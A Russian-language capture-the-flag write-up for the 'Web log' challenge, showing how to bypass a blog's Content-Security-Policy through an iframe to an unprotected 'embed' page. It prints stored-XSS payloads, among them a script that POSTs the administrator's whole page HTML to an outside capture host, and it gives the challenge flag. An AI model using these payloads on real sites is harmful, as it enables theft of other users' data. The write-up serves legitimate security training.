# Web log: Write-up

Есть блог, на котором можно входить в аккаунт и отправлять посты с HTML-форматированием.

В аутентификации нет видимых уязвимостей: ни SQLi, ни подбор логина-пароля ничего не дают. Поэтому будем разбираться с постами.

HTML-теги правда работают: можно вставлять любые теги от `<b>` и `<img>` и до `<script>`, но если форматирование работает, то скрипты не выполняются. Причина в наличии заголовков CSP:

```
Content-Security-Policy: default-src 'none'; frame-src *; img-src *; media-src *; style-src 'self'
```

Итак, скрипты на этой странице отключены, зато работают `<iframe>`, `<img>` и другое медиа. Это похоже на задание на XSS.

Для теста воспользуемся, например, сайтом [requestbin.com](https://requestbin.com). Он генерирует домен (в моем случае — https://eo5lxkppxdv416x.m.pipedream.net), запросы на который можно отслеживать. Если отправить пост с изображением с URL с этого домена, через короткое время придет GET-запрос — это администратор заходит почитать новый пост в блоге.

Картинки явно к XSS не приведут, а вот с `<iframe>` можно поиграться. Но на что его направить, чтобы не повлиял CORS? Очевидно, на тот же домен — не просто так же у каждого поста есть ссылка "embed", по которой CSP отключен!

> Во время CTF обнаружилось, что можно воспользоваться XSS на странице 404, но суть та же.

Итак, публикуем пост:

```html
<script>fetch("https://eo5lxkppxdv416x.m.pipedream.net");</script>
```

Видим, что ссылка "embed" ведет на https://weblog.o.2023.ugractf.ru/&lt;token&gt;/embed/2, и публикуем еще один пост:

```html
<iframe src="https://weblog.o.2023.ugractf.ru/<token>/embed/2"></iframe>
```

Убеждаемся, что GET-запрос приходит.

Теперь можно реализовать что-нибудь более полезное. Куки, к сожалению, оказываются пустые... Но они вполне могут быть httponly, а флаг явно лежит в первом посте и должен быть виден администратору, поэтому можно просто вытащить весь HTML:

```html
<script>
fetch("https://eo5lxkppxdv416x.m.pipedream.net", {
	method: "POST",
	body: parent.document.documentElement.outerHTML
});
</script>
```

Спустя время на сайт приходит администратор, и на наш сайт приходит POST-запрос, включающий в себя флаг:

```html
...
<article>
	<h2>A flag for my fellow subscribers</h2>
	<div class="author">
		<span>by&nbsp;</span>
		<b>admin</b>
		<a href="report/1">report</a>
		<a href="embed/1">embed</a>
	</div>
	<div class="content">
		
			ugra_cross_site_scripting_is_heavier_than_you_think_cgduh218qukn
		
	</div>
</article>
...
```

Флаг: **ugra_cross_site_scripting_is_heavier_than_you_think_cgduh218qukn**
